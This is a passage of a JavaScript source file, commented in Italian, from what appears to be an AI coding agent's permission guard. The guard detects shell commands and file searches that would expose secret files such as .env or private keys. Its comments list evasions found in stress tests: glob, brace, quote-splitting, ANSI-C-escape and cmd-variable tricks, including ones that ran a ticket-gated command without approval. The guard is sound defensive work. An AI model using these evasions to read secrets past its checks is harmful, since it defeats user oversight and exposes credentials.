  const base = segmenti[segmenti.length - 1];
  const cartelle = bassi.slice(0, -1);
  for (const [cartella, nomi] of Object.entries(PERCORSI_SEGRETI.fileInCartella)) {
    if (cartelle.includes(cartella) && nomi.includes(base.toLowerCase())) return 'segreto';
  }
  if (eNomeSegreto(base)) return 'segreto';
  if (PERCORSI_SEGRETI.comandiPortachiavi.includes(base.toLowerCase())) return 'portachiavi';
  return null;
}

/**
 * ⛔⛔⛔ F-S-001 (stress test della CLI, 08/10/2026; riprodotto sul desktop dfab19d54) — la RICERCA nei file restituiva il
 *   contenuto di `.env` e delle chiavi private al modello senza chiedere, mentre `leggi` e la shell chiedono: era l'aggiramento.
 *   ⛔ `secrets.json` NON è un nome segreto per `leggi`, quindi nemmeno per la ricerca (Hermes non lo blocca: `file_safety.py:332`).
 *   Owner: «la risposta è sempre quella di Hermes, Claude e Codex». Hermes (`tools/file_tools.py:234` e `:1099-1110`, clone
 *   65ad529) toglie dai risultati della ricerca ogni percorso bloccato in lettura — righe, nomi e conteggi — e dice quanti;
 *   Claude Code applica alla ricerca il controllo di lettura. ⇒ La ricerca chiede a QUESTA funzione, che è la stessa classe
 *   di `leggi` e della shell (`classeDelPezzo`): una grammatica sola, nessuna lista seconda da tenere allineata.
 * @param {string} percorso relativo alla radice del progetto (o assoluto)
 * @returns {boolean}
 */
export function eUnFileSegreto(percorso, { home = homeDiSistema(), cartella, leggiTesta, memoria } = {}) {
  if (typeof percorso !== 'string') return false;
  if (classeDelPezzo(percorso, home) !== null) return true;
  /* R1 (revisione del bugfixer, 16/10 notte): un hard link verso un segreto esce dalla ricerca come il segreto (owner «Cartella + radice + casa») */
  if (segretoDiUnCollegamentoFisico(percorso, { cartella, home, ...(memoria ? { memoria } : {}) }) !== null) return true;
  // 14/10/2026: un file d'esempio con una chiave vera dentro esce dalla ricerca come gli altri (serve la radice per leggerlo)
  return esempioConUnaChiave(percorso, { cartella, home, ...(leggiTesta ? { leggiTesta } : {}) }) !== null;
}

/**
 * I pezzi di un comando di shell che possono essere un percorso. ⛔ Non è un parser di shell e
 * non pretende di esserlo: si spezza su spazi e metacaratteri, perché quello che serve è
 * ACCORGERSI di un nome, non capire il comando. Un percorso fra virgolette CON spazi dentro si
 * spezza — dichiarato: è un innesco, e ciò che gli sfugge resta il comportamento di oggi.
 */
export function pezziDelComando(comando) {
  return String(comando ?? '').split(/[\s;|&<>()`"'=,]+/u).filter(Boolean);
}

/** Gli stessi pezzi di `pezziDelComando`, ciascuno col fatto che sia subito seguito da `(` (una chiamata: `s.key()`). */
function pezziConSeguito(comando) {
  const testo = String(comando ?? '');
  const pezzi = [];
  for (const trovato of testo.matchAll(/[^\s;|&<>()`"'=,]+/gu)) {
    pezzi.push({ pezzo: trovato[0], chiamata: testo[trovato.index + trovato[0].length] === '(' });
  }
  return pezzi;
}

/*
 * ⛔⛔⛔ C-005, terzo giro (08/10/2026) — IL GLOB SUL NOME DI UN SEGRETO.
 *
 * Il difetto (segnalato dal bugfixer del desktop, riprodotto su una bash vera): `cat .e?v`, `cat .en*`, `cat ./.e*v`, `cat .en[v]`,
 * `cat .en{v,}`, `cat cert.p?m` stampano `.env` / `cert.pem` e nessuna domanda partiva, perché `eNomeSegreto` giudica il TESTO del
 * pezzo (`.e?v` non è `.env`) mentre la shell espande il glob DOPO. È la classe che la ricerca di giugno 2026 chiama GuardFall
 * (Cloud Security Alliance / Adversa, 30/06/2026): l'agente ispeziona il testo grezzo, la shell lo trasforma in seguito.
 *
 * La cura rifà il passo che la shell fa dopo: espande le graffe (testo puro, prima di ogni altra cosa, come in bash) e poi il glob
 * `* ? [..]` + extglob sui FILE VERI della cartella di lavoro, e guarda i nomi che combaciano con la stessa grammatica di sempre.
 * Fonti: GNU Bash manual 3.5.1 e 3.5.8 (graffe prima del resto; il punto iniziale va scritto, salvo `dotglob`); PowerShell
 * about_Wildcards (la stella prende anche i file col punto); Codex (clone 24/09/2026: `windows-sandbox-rs/deny_read_resolver.rs`,
 * `linux-sandbox/bwrap.rs`) risolve le regole di blocco con glob (tutti i file `.env` sotto una cartella) SUL DISCO con un tetto di
 * profondità e rifiuta di espandere lo stesso glob dalla radice del disco; Cline (`ClineIgnoreController.validateCommand`) confronta l'argomento come TESTO e ha lo stesso buco;
 * Hermes (`tools/approval.py`) e OpenCode (`tool/shell.ts`) non hanno nessun controllo sui nomi segreti; Goose idem.
 *
 * ⛔ Dichiarato, non nascosto: resta un INNESCO, non un confine. Non vede `$(echo .env)`, `$IFS`, variabili, `eval`, una `cd` prima
 * del glob, i qualificatori di zsh. Il confine vero è il sandbox, non il testo del comando.
 * ⛔ Solo per la SHELL: `leggi`/`elenca` ricevono un percorso letterale che nessuna shell espande.
 * ⛔ Conservativo, mai permissivo: maiuscole e minuscole uguali; la stella prende il file col punto su Windows (cmd e PowerShell lo
 * fanno) e non su un sistema POSIX; un pattern che non si riesce a esplorare (cartella illeggibile, troppe cartelle) CHIEDE.
 */
export const TETTI_GLOB_SEGRETI = Object.freeze({ alternative: 64, cartelle: 1000, nomi: 200_000, millisecondi: 100 });

/* v5 (08/10/2026): ciò che la shell sostituisce senza che il testo lo dica (`${X}`, `$X`, `$(..)`, apici inversi) diventa questo carattere: un jolly
   che combacia con qualunque cosa, ANCHE con il punto iniziale (una variabile può valere `.`). Dall'area d'uso privato di Unicode: nessun nome vero lo contiene. */
const JOLLY = '\uE000';
const eUnGlob = (parola) => /[*?[\uE000]|[@+!]\(/u.test(parola);

/** L'indice della chiusura bilanciata dell'apertura in `testo[da]`, o -1. Una barra rovescia salta il carattere dopo. */
function chiusaBilanciata(testo, da, apre, chiude) {
  let profondita = 0;
  for (let i = da; i < testo.length; i += 1) {
    if (testo[i] === '\\') { i += 1; continue; }
    if (testo[i] === apre) profondita += 1;
    else if (testo[i] === chiude) { profondita -= 1; if (profondita === 0) return i; }
  }
  return -1;
}

/** Il contenuto di `$'..'` come lo decodifica bash (manuale 3.1.2.4): `\n`, `\xHH`, `\NNN` ottale, `\uHHHH`, `\cX`… — `$'\x2eenv'` è `.env`. */
function decodificaAnsiC(s) {
  const semplici = { a: '\u0007', b: '\b', e: '\u001b', E: '\u001b', f: '\f', n: '\n', r: '\r', t: '\t', v: '\v', '\\': '\\', "'": "'", '"': '"', '?': '?' };
  let fuori = '';
  for (let i = 0; i < s.length; i += 1) {
    if (s[i] !== '\\' || i + 1 >= s.length) { fuori += s[i]; continue; }
    const c = s[i + 1];
    let m;
    if (semplici[c] !== undefined) { fuori += semplici[c]; i += 1; }
    else if ((m = /^x([0-9A-Fa-f]{1,2})/u.exec(s.slice(i + 1)))) { fuori += String.fromCodePoint(parseInt(m[1], 16)); i += m[0].length; }
    else if ((m = /^u([0-9A-Fa-f]{1,4})/u.exec(s.slice(i + 1)))) { fuori += String.fromCodePoint(parseInt(m[1], 16)); i += m[0].length; }
    else if ((m = /^U([0-9A-Fa-f]{1,8})/u.exec(s.slice(i + 1)))) { const n = parseInt(m[1], 16); fuori += n <= 0x10ffff ? String.fromCodePoint(n) : JOLLY; i += m[0].length; }
    else if ((m = /^[0-7]{1,3}/u.exec(s.slice(i + 1)))) { fuori += String.fromCodePoint(parseInt(m[0], 8) & 0xff); i += m[0].length; }
    else if (c === 'c' && i + 2 < s.length) { fuori += String.fromCodePoint(s.codePointAt(i + 2) & 0x1f); i += 2; }
    else { fuori += '\\' + c; i += 1; }
  }
  return fuori;
}

/*
 * ⛔ F2 dei buchi della guardia (revisione di Performance, 03/11/2026 notte, S2): le variabili di cmd non diventavano un jolly, mentre `${f}` sì, e Windows è la
 *   piattaforma principale. `cmd /c "set x=bigli&& node %x%etto-talos.mjs"`, `cmd /v /c "… !x!etto…"` e `node %X%iglietto-talos.mjs` lanciavano il comando dei biglietti
 *   senza carta. Nella lettura di cmd e PowerShell (`variabiliDiCmd`, accesa insieme a `barraDiWindows`) diventano il jolly: `%nome%` (anche `%nome:~0,3%` e
 *   `%nome:a=b%`), `!nome!` (l'espansione ritardata di `cmd /v`), gli argomenti `%1`, `%~dp0`, `%*` e le variabili del `for` nei file batch (`%%i`). Microsoft Learn,
 *   «cmd» (aggiornata il 22/10/2025): `%VariableName%` si sostituisce col valore, `/v:on` abilita `!`. Claude Code 2.1.317 fa la stessa lettura in più
 *   («with cmd's %NAME% variables replaced», `claude.exe` offset 310048877); lui sostituisce i valori dell'ambiente, qui il valore non si sa e vale il jolly.
 * ⛔ `%HOME%` e `%USERPROFILE%` restano scritti: `conLaHomeEspansa` li riconosce come la casa. ⛔ Resta fuori, detto: la variabile del `for` scritta a mano con un `%`
 *   solo (`for %i in (…) do node %i…`), perché `%s`, `%d` e `%Y` dei formati (`date +%Y`, `printf "%s"`) diventerebbero tutti un jolly.
 */
const VARIABILE_DI_CMD = /%(?:[A-Za-z_][^%\s=:]*(?::[^%\s]*)?%|~[A-Za-z]*[0-9*]|[0-9*]|%[A-Za-z])|![A-Za-z_][^!\s=:]*(?::[^!\s]*)?!/uy;
function variabileDiCmd(t, i) {
  VARIABILE_DI_CMD.lastIndex = i;
  const trovata = VARIABILE_DI_CMD.exec(t);
  if (!trovata) return null;
  return { testo: /^%(?:HOME|USERPROFILE)%$/iu.test(trovata[0]) ? trovata[0] : JOLLY, fine: i + trovata[0].length - 1 };
}

/** Il testo fra doppi apici a partire da `da` (dopo l'apice): toglie gli escape che bash toglie lì, `$..` e apici inversi diventano il jolly. */
function dentroDoppie(t, da, { variabiliDiCmd = false } = {}) {
  let fuori = '';
  for (let i = da; i < t.length; i += 1) {
    const c = t[i];
    if (c === '"') return { testo: fuori, fine: i };
    if (variabiliDiCmd && (c === '%' || c === '!')) {
      const variabile = variabileDiCmd(t, i);
      if (variabile) { fuori += variabile.testo; i = variabile.fine; continue; }
    }
    if (c === '\\' && i + 1 < t.length) {
      const n = t[i + 1];
      if (n === '\n') { i += 1; continue; }
      if (n === '\r' && t[i + 2] === '\n') { i += 2; continue; }
      if ('$`"\\'.includes(n)) { fuori += n; i += 1; continue; }
      fuori += c;
      continue;
    }
    if (c === '$') { const r = espansione(t, i); fuori += r.testo; i = r.fine; continue; }
    if (c === '`') { const fine = t.indexOf('`', i + 1); fuori += JOLLY; i = fine === -1 ? t.length : fine; continue; }
    fuori += c;
  }
  return { testo: fuori, fine: t.length };
}

/**
 * Un `$` in `t[i]`: la home resta scritta com'è (`conLaHomeEspansa` la riconosce); ogni altra sostituzione diventa il jolly; `$'..'` si decodifica;
 * `$".."` è una stringa fra doppi apici. Torna il testo e l'indice dell'ultimo carattere consumato.
 */
function espansione(t, i) {
  const n = t[i + 1];
  if (n === "'") {
    let j = i + 2;
    for (; j < t.length && t[j] !== "'"; j += 1) if (t[j] === '\\') j += 1;
    return { testo: decodificaAnsiC(t.slice(i + 2, j)), fine: Math.min(j, t.length) };
  }
  if (n === '"') return dentroDoppie(t, i + 2);
  if (n === '{') {
    const fine = chiusaBilanciata(t, i + 1, '{', '}');
    if (fine === -1) return { testo: JOLLY, fine: t.length };
    return { testo: /^(?:HOME|USERPROFILE)$/u.test(t.slice(i + 2, fine)) ? t.slice(i, fine + 1) : JOLLY, fine };
  }
  if (n === '(') { const fine = chiusaBilanciata(t, i + 1, '(', ')'); return { testo: JOLLY, fine: fine === -1 ? t.length : fine }; }
  const ambiente = /^\$env:([A-Za-z_][A-Za-z0-9_]*)/iu.exec(t.slice(i));
  if (ambiente) return { testo: /^(?:HOME|USERPROFILE)$/iu.test(ambiente[1]) ? ambiente[0] : JOLLY, fine: i + ambiente[0].length - 1 };
  const nome = /^\$([A-Za-z_][A-Za-z0-9_]*)/u.exec(t.slice(i));
  if (nome) return { testo: nome[1] === 'HOME' ? nome[0] : JOLLY, fine: i + nome[0].length - 1 };
  if (n !== undefined && /[0-9@*#?$!-]/u.test(n)) return { testo: JOLLY, fine: i + 1 };
  return { testo: '$', fine: i };
}

/**
 * ⛔ v5 (08/10/2026, segnalazione del bugfixer del desktop, riprodotta su una bash vera): le PAROLE come le vede la shell DOPO la rimozione delle
 * virgolette. `.e""nv`, `.e''nv`, `.e\nv`, `".e"nv`, `.e"n"v`, `".e"'n'v`, `.e$'n'v`, `$'\x2eenv'` sono tutte `.env`; `.e${X}nv` con X vuota pure.
 * Pezzi adiacenti fra apici e senza si uniscono in UNA parola (come Codex, `shell-command/src/bash.rs` «concatenation»); gli apici e gli escape si
 * tolgono (bash, manuale 3.1.2 e 3.5.9); `^` fuori da una classe è l'escape di cmd e si toglie; una sostituzione che il testo non dice diventa il jolly.
 * Una graffa `{a,b}` e un gruppo extglob `@(a|b)` restano UNA parola. Ogni parola porta `chiamata`: subito dopo c'è `(` e finisce con una lettera, come
 * `s.key()` (un metodo, non un file: ticket C-005). Dichiarato: non è un parser di shell; i corpi di heredoc si tolgono prima.
 */
function paroleDellaShell(testo, { barraDiWindows = false, variabiliDiCmd = false } = {}) {
  const t = String(testo ?? '');
  const parole = [];
  let corrente = '';
  let graffe = 0;
  let tonde = 0;
  /* F-P-004c (12/10/2026): ogni parola porta anche il COMANDO del suo segmento (la prima parola dopo `;`, `&`, `|`, `(`, `)` o a capo),
     così chi la giudica sa se quel comando legge i file o stampa soltanto i suoi argomenti. */
  let comando = null;
  /* blocco dopo (S3 della revisione di Performance, 04/11/2026): e il numero del segmento, così chi rilegge il codice di un interprete prende solo le parole del suo
     segmento (`bash -c "echo 0" && bash -c "echo 1"` sono due comandi, non uno dentro l'altro) */
  let segmento = 0;
  const chiudi = (separatore) => {
    if (corrente !== '') {
      if (comando === null) comando = corrente;
      parole.push({ testo: corrente, chiamata: separatore === '(' && /[A-Za-z0-9_]$/u.test(corrente), comando, segmento });
    }
    if (/[;&|()\n]/u.test(separatore)) { comando = null; segmento += 1; }
    corrente = ''; graffe = 0; tonde = 0;
  };
  for (let i = 0; i < t.length; i += 1) {
    const c = t[i];
    if (tonde > 0) {
      if (/\s/u.test(c)) { chiudi(c); continue; }
      corrente += c;
      if (c === '(') tonde += 1; else if (c === ')') tonde -= 1;
      continue;
    }
    if (c === '(' && /[@?*+!]$/u.test(corrente)) { tonde = 1; corrente += c; continue; }
    /* F-P-004 (12/10/2026): nella lettura di cmd e PowerShell `\` è il separatore delle cartelle, non un escape. */
    if (c === '\\' && barraDiWindows) { corrente += '/'; continue; }
    if (c === '\\') {
      const n = t[i + 1];
      if (n === undefined) continue;
      if (n === '\n') { i += 1; continue; }
      if (n === '\r' && t[i + 2] === '\n') { i += 2; continue; }
      corrente += n; i += 1; continue;
    }
    if (c === "'") { const fine = t.indexOf("'", i + 1); if (fine === -1) { corrente += t.slice(i + 1); break; } corrente += t.slice(i + 1, fine); i = fine; continue; }
    if (c === '"') { const r = dentroDoppie(t, i + 1, { variabiliDiCmd }); corrente += r.testo; i = r.fine; continue; }
    if (variabiliDiCmd && (c === '%' || c === '!')) {
      const variabile = variabileDiCmd(t, i);
      if (variabile) { corrente += variabile.testo; i = variabile.fine; continue; }
    }
    if (c === '$') { const r = espansione(t, i); corrente += r.testo; i = r.fine; continue; }
    if (c === '`') { const fine = t.indexOf('`', i + 1); corrente += JOLLY; i = fine === -1 ? t.length : fine; continue; }
    if (c === '^' && !corrente.endsWith('[')) continue;
    if (graffe > 0 && !/[\s;&|<>()]/u.test(c)) {
      corrente += c;
      if (c === '{') graffe += 1; else if (c === '}') graffe -= 1;
      continue;
    }
    if (/[\s;&<>=|()]/u.test(c)) { chiudi(c); continue; }
    if (c === '{') graffe += 1;
    corrente += c;
  }
  chiudi('');
  return parole;
}

/** Il primo `{a,b}` di primo livello con almeno una virgola di primo livello, come lo apre bash; `{x}` senza virgola resta testo. */
function primoGruppoDiGraffe(parola) {
  for (let inizio = parola.indexOf('{'); inizio !== -1; inizio = parola.indexOf('{', inizio + 1)) {
    let profondita = 0;
    const virgole = [];
    for (let i = inizio; i < parola.length; i += 1) {
      const c = parola[i];
      if (c === '{') profondita += 1;
      else if (c === '}') {
        profondita -= 1;
        if (profondita === 0) {
          if (virgole.length === 0) break;
          const tagli = [inizio, ...virgole, i];
          const alternative = [];
          for (let k = 0; k + 1 < tagli.length; k += 1) alternative.push(parola.slice(tagli[k] + 1, tagli[k + 1]));
          return { prima: parola.slice(0, inizio), alternative, dopo: parola.slice(i + 1) };
        }
      } else if (c === ',' && profondita === 1) virgole.push(i);
    }
  }
  return null;
}

/** Le graffe si espandono per prime e senza toccare il disco: `.en{v,}` è `.env` e `.en` per la shell, esista o no il file. */
function espandiGraffe(parola) {
  const daFare = [parola];
  const finiti = [];
  while (daFare.length > 0) {
    const p = daFare.shift();
    const gruppo = primoGruppoDiGraffe(p);
    if (!gruppo) finiti.push(p);
    else for (const a of gruppo.alternative) daFare.push(gruppo.prima + a + gruppo.dopo);
    if (finiti.length + daFare.length > TETTI_GLOB_SEGRETI.alternative) return { parole: finiti, troppe: true };
  }
  return { parole: finiti, troppe: false };
}

/*
 * ⛔ Il buco dei segreti (revisione di Performance, 03/11/2026 notte, S3, c'era già prima di N11): `cat .env` chiedeva, `cat .en{v..v}` e `cat .e{m..o}v` no. Una
 *   sequenza non ha virgole, quindi `espandiGraffe` la lasciava com'era e il nome scritto non era più `.env`. Ma bash la espande per prima, come le graffe a virgola
 *   (manuale, §3.5.1 «Brace Expansion»: `{x..y[..incr]}`, x e y interi o lettere). ⇒ La sequenza si scrive per esteso, come la scrive bash: `.en{v..v}` è `.env`,
 *   `.e{m..o}v` è `.emv`, `.env`, `.eov`. Interi anche negativi, gli zeri davanti allargano tutte le forme (`{01..03}`), il segno del passo non conta: le stesse regole di
 *   `braceSequence` in mvdan/sh (`expand/braces.go:134-200`). Una sequenza scritta male, più lunga del tetto delle alternative o che darebbe `,` `{` `}` `\` o uno spazio
 *   vale il jolly, come in N11: un insieme più largo, mai più stretto.
 * ⛔ Una funzione sola per la guardia dei biglietti e per il controllo dei segreti (`formeDellaParola`): la stessa grammatica, nessuna seconda lista da tenere allineata.
 */
function formeDellaSequenza(dentro) {
  const m = /^(?:(-?\d+)\.\.(-?\d+)|([A-Za-z])\.\.([A-Za-z]))(?:\.\.(-?\d+))?$/u.exec(dentro);
  if (!m) return null;
  const numeri = m[1] !== undefined;
  const da = numeri ? Number(m[1]) : m[3].codePointAt(0);
  const a = numeri ? Number(m[2]) : m[4].codePointAt(0);
  const passo = Math.abs(Number(m[5] ?? 1)) || 1;
  if (!Number.isSafeInteger(da) || !Number.isSafeInteger(a) || !Number.isSafeInteger(passo)) return null;
  if (Math.floor(Math.abs(a - da) / passo) + 1 > TETTI_GLOB_SEGRETI.alternative) return null;
  const larghezza = numeri && (/^-?0\d/u.test(m[1]) || /^-?0\d/u.test(m[2])) ? Math.max(m[1].length, m[2].length) : 0;
  const forme = [];
  const su = da <= a;
  for (let n = da; su ? n <= a : n >= a; n += su ? passo : -passo) {
    const forma = !numeri ? String.fromCodePoint(n) : n < 0 ? `-${String(-n).padStart(larghezza - 1, '0')}` : String(n).padStart(larghezza, '0');
    if (/[,{}\\\s]/u.test(forma)) return null;
    forme.push(forma);
  }
  return forme;
}
/** Ogni `{x..y}` senza graffe dentro, scritta per esteso (`{a,b,c}`, o la sola forma), o il jolly se non si può. */
function conLeSequenzeEspanse(parola, { comeJolly = false } = {}) {
  return parola.replace(/\{([^{}\s]*?\.\.[^{}\s]*?)\}/gu, (_, dentro) => {
    const forme = comeJolly ? null : formeDellaSequenza(dentro);
    if (forme === null) return JOLLY;
    return forme.length === 1 ? forme[0] : `{${forme.join(',')}}`;
  });
}
/**
 * Le forme di UNA parola dopo le graffe, come le fa bash: sequenze e virgole. Se le sequenze scritte per esteso superano il tetto (`{a..z}{a..z}` sono 676 forme) si
 * riprova con le sequenze come jolly, che è la lettura di N11: così `mkdir {a..z}{a..z}` non diventa una carta. `testo` è la parola con le sequenze già trattate.
 */
function formeDellaParola(parola) {
  const esatte = conLeSequenzeEspanse(parola);
  const prima = espandiGraffe(esatte);
  if (!prima.troppe || esatte === parola) return { ...prima, testo: esatte };
  const larghe = conLeSequenzeEspanse(parola, { comeJolly: true });
  return { ...espandiGraffe(larghe), testo: larghe };
}

const CLASSI_POSIX = Object.freeze({
  alpha: 'A-Za-z', digit: '0-9', alnum: 'A-Za-z0-9', upper: 'A-Z', lower: 'a-z', space: '\\s', blank: ' \\t', punct: '!-/:-@\\[-`{-~',
  xdigit: '0-9A-Fa-f', cntrl: '\\x00-\\x1f', print: ' -~', graph: '!-~',
});
const escapaRegex = (c) => c.replace(/[.*+?^${}()|[\]\\/]/gu, '\\$&');

function parentesiChiusa(g, aperta) {
  let profondita = 0;
  for (let i = aperta; i < g.length; i += 1) {
    if (g[i] === '(') profondita += 1;
    else if (g[i] === ')') { profondita -= 1; if (profondita === 0) return i; }
  }
  return -1;
}

function dividiAlternative(interno) {
  const parti = [];
  let profondita = 0;
  let inizio = 0;
  for (let i = 0; i < interno.length; i += 1) {
    if (interno[i] === '(') profondita += 1;
    else if (interno[i] === ')') profondita -= 1;
    else if (interno[i] === '|' && profondita === 0) { parti.push(interno.slice(inizio, i)); inizio = i + 1; }
  }
  parti.push(interno.slice(inizio));
  return parti;
}

/** `[abc]`, `[!a-c]`, `[^x]`, `[[:digit:]]`: la classe che comincia in `g[i]`, o null se non si chiude (allora `[` è una lettera). */
function traduciClasse(g, i) {
  let j = i + 1;
  let negata = false;
  if (g[j] === '!' || g[j] === '^') { negata = true; j += 1; }
  let corpo = '';
  let primo = true;
  for (; j < g.length; j += 1) {
    const c = g[j];
    if (c === ']' && !primo) return { regex: `[${negata ? '^' : ''}${corpo}]`, fine: j };
    primo = false;
    if (c === '[' && g[j + 1] === ':') {
      const chiusa = g.indexOf(':]', j + 2);
      const nomeClasse = chiusa === -1 ? '' : g.slice(j + 2, chiusa);
      if (CLASSI_POSIX[nomeClasse]) { corpo += CLASSI_POSIX[nomeClasse]; j = chiusa + 1; continue; }
    }
    corpo += c === '\\' || c === ']' || c === '[' || c === '^' ? `\\${c}` : c;
  }
  return null;
}

/**
 * Un segmento CON extglob in una espressione regolare. `@(a|b)` e `?(a|b)` si traducono per davvero; `*(..)`, `+(..)` e `!(..)` valgono
 * «qualunque cosa»: un insieme più LARGO, mai più stretto (chiede di più, mai di meno) e senza ripetizioni annidate, quindi senza il
 * blocco da backtracking esponenziale che `*(a|aa)` darebbe a un'espressione regolare.
 */
function traduciGlob(g) {
  let fuori = '';
  for (let i = 0; i < g.length; i += 1) {
    const c = g[i];
    if ('@?*+!'.includes(c) && g[i + 1] === '(') {
      const fine = parentesiChiusa(g, i + 1);
      if (fine !== -1) {
        const alternative = dividiAlternative(g.slice(i + 2, fine)).map(traduciGlob).join('|');
        fuori += c === '@' ? `(?:${alternative})` : c === '?' ? `(?:${alternative})?` : '[^/]*';
        i = fine;
        continue;
      }
    }
    if (c === '*' || c === JOLLY) { fuori += '[^/]*'; continue; }
    if (c === '?') { fuori += '[^/]'; continue; }
    if (c === '[') {
      const classe = traduciClasse(g, i);
      if (classe) { fuori += classe.regex; i = classe.fine; continue; }
    }
    fuori += escapaRegex(c);
  }
  return fuori;
}

/**
 * Un segmento SENZA extglob in una funzione `nome => booleano`: lettere, `?`, `*` e `[..]`, con l'algoritmo a due puntatori (tempo
 * O(n·m): un `*a*a*a*a*b` scritto dal modello contro un nome lungo non può bloccare il controllo, come farebbe una espressione regolare).
 */
function combaciatoreSemplice(segmento) {
  const atomi = [];
  for (let i = 0; i < segmento.length; i += 1) {
    const c = segmento[i];
    /* il jolly di una sostituzione vale come una stella: un solo atomo per una fila di stelle e jolly */
    if (c === '*' || c === JOLLY) { if (atomi.length === 0 || atomi[atomi.length - 1].t !== 's') atomi.push({ t: 's' }); continue; }
    if (c === '?') { atomi.push({ t: 'q' }); continue; }
    if (c === '[') {
      const classe = traduciClasse(segmento, i);
      if (classe) {
        let regola;
        try { regola = new RegExp(`^${classe.regex}$`, 'i'); } catch { regola = /^[^/]$/u; }
        atomi.push({ t: 'c', regola });
        i = classe.fine;
        continue;
      }
    }
    atomi.push({ t: 'l', lettera: c.toLowerCase() });
  }
  const uno = (atomo, lettera) => atomo.t === 'q' || (atomo.t === 'l' ? lettera.toLowerCase() === atomo.lettera : atomo.regola.test(lettera));
  return (nome) => {
    let i = 0;
    let j = 0;
    let stella = -1;
    let segno = 0;
    while (i < nome.length) {
      if (j < atomi.length && atomi[j].t === 's') { stella = j; j += 1; segno = i; }
      else if (j < atomi.length && uno(atomi[j], nome[i])) { i += 1; j += 1; }
      else if (stella !== -1) { j = stella + 1; segno += 1; i = segno; }
      else return false;
    }
    while (j < atomi.length && atomi[j].t === 's') j += 1;
    return j === atomi.length;
  };
}

/**
 * Il segmento come lo vede la shell. Il punto iniziale va scritto (bash senza `dotglob`); dove la shell è cmd o PowerShell la stella
 * lo prende comunque (`puntiNascosti`). Maiuscole e minuscole uguali: chiedere di più, mai di meno. Se la regola non si compila
 * (un intervallo rovesciato) vale il segmento più largo possibile.
 */
function combaciatoreDelSegmento(segmento, puntiNascosti) {
  /* una sostituzione in testa può valere `.`: lì la regola del punto non vale */
  const nascosto = !puntiNascosti && !segmento.startsWith('.') && !segmento.startsWith(JOLLY);
  let combacia;
  if (/[@?*+!]\(/u.test(segmento)) {
    const molte = segmento.split('*').length - 1 > 3;
    let regola;
    try { regola = new RegExp(`^${molte ? '[^/]*' : traduciGlob(segmento)}$`, 'i'); } catch { regola = /^[^/]*$/u; }
    combacia = (nome) => regola.test(nome);
  } else combacia = combaciatoreSemplice(segmento);
  return (nome) => !(nascosto && nome.startsWith('.')) && combacia(nome);
}

/** I nomi di una cartella e, a parte, quelli che possono essere cartelle (cartelle vere, collegamenti e giunzioni: dove il tipo non si sa, si tiene). */
function elencaDalDisco(cartella) {
  try {
    const voci = elencaSync(cartella, { withFileTypes: true });
    return { nomi: voci.map((v) => v.name), cartelle: new Set(voci.filter((v) => v.isDirectory() || v.isSymbolicLink() || (!v.isFile() && !v.isDirectory())).map((v) => v.name)) };
  } catch (errore) { return { errore: errore?.code ?? 'EIO' }; }
}

/**
 * Espande UNA parola con un glob sui file veri. Torna i percorsi che la shell leggerebbe (come li ha scritti la persona, con i nomi
 * veri al posto dei caratteri jolly), e due fatti: `troppe` (oltre i tetti) e `illeggibile` (una cartella che non si apre per un
 * motivo diverso da «non c'è»). ENOENT/ENOTDIR non sono un problema: il glob non combacia con niente lì.
 */
function candidatiDelGlob(parola, { home, cartella, elenca, puntiNascosti, bilancio }) {
  const normalizzato = conLaHomeEspansa(parola, home);
  if (normalizzato === '' || normalizzato.includes('://')) return { candidati: [], troppe: false, illeggibile: false };
  const segmenti = normalizzato.split('/');
  let stati;
  let da = 0;
  if (segmenti[0] === '') { stati = [{ reale: '/', mostrato: [''] }]; da = 1; }
  else if (/^[A-Za-z]:$/u.test(segmenti[0])) { stati = [{ reale: `${segmenti[0]}/`, mostrato: [segmenti[0]] }]; da = 1; }
  else if (typeof cartella === 'string' && cartella !== '') stati = [{ reale: cartella, mostrato: [] }];
  else return { candidati: [], troppe: false, illeggibile: false };
  let illeggibile = false;
  let ultimo = segmenti.length - 1;
  while (ultimo > 0 && segmenti[ultimo] === '') ultimo -= 1;
  for (let k = da; k < segmenti.length; k += 1) {
    const segmento = segmenti[k];
    if (segmento === '') continue;
    if (segmento === '.' || segmento === '..' || !eUnGlob(segmento)) {
      stati = stati.map((s) => ({ reale: join(s.reale, segmento), mostrato: [...s.mostrato, segmento] }));
      continue;
    }
    const combacia = combaciatoreDelSegmento(segmento, puntiNascosti);
    const nuovi = [];
    for (const s of stati) {
      const chiave = s.reale;
      let voce = bilancio.cache.get(chiave);
      if (voce === undefined) {
        if (bilancio.cartelle >= TETTI_GLOB_SEGRETI.cartelle) return { candidati: [], troppe: true, illeggibile };
        /* v5: un tetto di TEMPO oltre a quello di cartelle (il desktop serve ogni sessione da un processo solo: mezzo secondo fermo è troppo). Speso: si chiede. */
        if (bilancio.orologio() > bilancio.scadenza) return { candidati: [], troppe: true, illeggibile };
        bilancio.cartelle += 1;
        voce = elenca(chiave) ?? { errore: 'EIO' };
        bilancio.cache.set(chiave, voce);
      }
      if (voce.errore) { if (voce.errore !== 'ENOENT' && voce.errore !== 'ENOTDIR') illeggibile = true; continue; }
      /* v5: un segmento che non è l'ultimo porta solo a cartelle (o collegamenti): i file non si aprono, e non si tenta di elencarli */
      const soloCartelle = k < ultimo && voce.cartelle instanceof Set ? voce.cartelle : null;
      for (const nomeVoce of voce.nomi ?? []) {
        bilancio.nomi += 1;
        if (bilancio.nomi > TETTI_GLOB_SEGRETI.nomi) return { candidati: [], troppe: true, illeggibile };
        if (soloCartelle && !soloCartelle.has(nomeVoce)) continue;
        if (!combacia(nomeVoce)) continue;
        nuovi.push({ reale: join(s.reale, nomeVoce), mostrato: [...s.mostrato, nomeVoce] });
      }
    }
    stati = nuovi;
    if (stati.length === 0) break;
  }
  return { candidati: stati.map((s) => s.mostrato.join('/')), troppe: false, illeggibile };
}

/**
 * Il corpo di un heredoc è testo: la shell non espande mai i caratteri jolly lì dentro (con il delimitatore fra virgolette non espande
 * niente; senza, espande solo variabili e `$(..)`). Per questo passo si toglie, e uno script Python o un README di cento righe con
 * `import *` e `* voce` non apre cento cartelle né chiede per ogni asterisco. ⛔ Due eccezioni, perché lì il corpo è un programma:
 * un heredoc che alimenta una SHELL (`bash <<'X'`), e un corpo senza virgolette che contiene `$(..)` o apici inversi (si eseguono).
 * Un heredoc che non si chiude non si tocca.
 */
/*
 * ⛔ R4 della revisione del blocco permessi (04/11/2026, su S6): la shell si cercava solo PRIMA del `<<`, e il `<<` anche nei commenti e
 *   fra virgolette. `cat <<'X' | bash` (il corpo va a una shell DOPO il delimitatore) e `# <<'X'` (nessun heredoc: le righe dopo sono
